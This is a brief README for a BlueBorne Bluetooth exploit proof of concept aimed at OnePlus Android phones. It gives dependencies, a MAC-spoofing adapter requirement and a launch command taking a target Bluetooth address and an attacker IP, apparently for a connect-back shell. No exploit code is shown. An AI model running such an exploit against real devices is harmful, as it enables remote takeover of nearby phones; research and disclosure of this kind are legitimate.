BlueBorne Android Exploit PoC for OnePlus

base on https://github.com/ArmisSecurity/blueborne/


Dependencies:

pip2 packages: pybluez, pwn

- sudo apt-get install libbluetooth-dev
- sudo pip2 install pybluez pwn

A CSR USB bluetooth adapter. We need to change the MAC address, and so we use a vendor specific HCI command to do this
for the CSR bluetooth adapter.
To run:

sudo python2 doit.py hci0 <target-bdaddr> <attacker-ip>
